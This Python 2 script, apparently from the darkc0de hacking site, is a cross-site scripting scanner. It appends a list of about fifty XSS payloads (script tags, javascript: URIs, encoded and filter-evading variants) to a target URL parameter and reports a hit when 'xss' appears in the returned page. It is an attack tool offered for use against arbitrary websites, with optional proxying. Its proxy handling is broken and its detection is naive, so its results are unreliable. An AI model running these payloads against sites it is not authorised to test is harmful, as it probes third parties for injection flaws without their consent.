#!/usr/bin/python 
#Checks host against xss payloads by searching source
#for XSS. (simple) 

#Ver 1.1: Added Proxy Support
 
#http://www.darkc0de.com 
#d3hydr8[at]gmail[dot]com 
 
import sys, urllib2, re, time, httplib, socket

xss_ploads = ["%22%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E", 
	"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
	"'';!--\"<XSS>=&{()}",
	"<IMG SRC=\"javascript:alert('XSS');\">",
	"<IMG SRC=javascript:alert('XSS')>",
	"<IMG SRC=JaVaScRiPt:alert('XSS')>",
	"<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
	"<IMG SRC=`javascript:alert(\"is this, 'XSS'\")`>",
	"<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
	"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
	"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
	"<IMG SRC=\"jav	ascript:alert('XSS');\">",
	"<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
	"<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
	"<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
	"perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out",
	"perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out",
	"<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
	"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(\"XSS\")>",
	"<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
	"<IMG SRC=\"javascript:alert('XSS')\"",
	"<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>",
	"\";alert('XSS');//",
	"</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>",
	"<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
	"<BODY BACKGROUND=\"javascript:alert('XSS')\">",
	"<BODY ONLOAD=alert('XSS')>",
	"<IMG DYNSRC=\"javascript:alert('XSS')\">",
	"<IMG LOWSRC=\"javascript:alert('XSS')\">",
	"<BGSOUND SRC=\"javascript:alert('XSS');\">",
	"<BR SIZE=\"&{alert('XSS')}\">",
	"<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
	"<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS",
	"<IMG SRC='vbscript:msgbox(\"XSS\")'>",
	"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
	"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",
	"<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
	"<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
	"<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
	"<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
	"<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
	"<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">",
	"<DIV STYLE=\"width: expression(alert('XSS'));\">",
	"<STYLE>@im\port'\ja\vasc\ript:alert(\"XSS\")';</STYLE>",
	"<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
	"<XSS STYLE=\"xss:expression(alert('XSS'))\">",
	"<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>",
	"<BASE HREF=\"javascript:alert('XSS');//\">",
	"<? echo('<SCR)'; echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>",
	"<A HREF=\"http://1113982867/\">XSS</A>",
	"<A HREF=\"http://www.google.com./\">XSS</A>"]

def xss(payload):
	print "Testing:",payload #Comment out if needed
	try:
		if proxy != 0:
			proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'})
			opener = urllib2.build_opener("http://"+host+payload, proxy_handler)
			source = opener.open("http://"+host+payload).read()
		else:
			source = urllib2.urlopen("http://"+host+payload).read()
		print "Source Length:",len(source) #Comment out if needed
		if re.search("xss", source.lower()) != None: 
			print "\n[!] XSS:",host+payload,"\n"
		else: 
			print "[-] Not Vuln." 
	except(urllib2.HTTPError), msg:
		print "[-] Error:",msg
		pass

print "\nd3hydr8[at]gmail[dot]com XSStest v1.1" 
print "---------------------------------------" 
 
if len(sys.argv) not in [2,4]: 
	print "\nUsage: ./xsstest.py <site> <options>"
	print "\t[options]"
	print "\t   -p/-proxy <host:port> : Add proxy support"
	print "ex: ./xsstest.py www.example.com/index.php?page= 20.15.4.76:3128\n"  
	sys.exit(1) 
 
host = sys.argv[1].replace("http://","") 
if host[-1:] != "=": 
	print "\n[-] Host should end with a \'=\'\n" 
	sys.exit(1)
	
try:
	if sys.argv[3]:
		proxy = sys.argv[3]
		print "\n[+] Testing Proxy..."
		h2 = httplib.HTTPConnection(proxy)
		h2.connect()
		print "[+] Proxy:",proxy
except(socket.timeout):
	print "\n[-] Proxy Timed Out"
	proxy = 0
	pass
except(NameError):
	print "\n[-] Proxy Not Given"
	proxy = 0
	pass
except:
	print "\n[-] Proxy Failed"
	proxy = 0
	pass
print "\n[+] Scanning:",host
print "[+] Loaded:",len(xss_ploads),"payloads\n"
for payload in xss_ploads:
	time.sleep(5) #Change this in seconds, if needed
	xss(payload.replace("\n",""))
print "\n[+] Done\n" 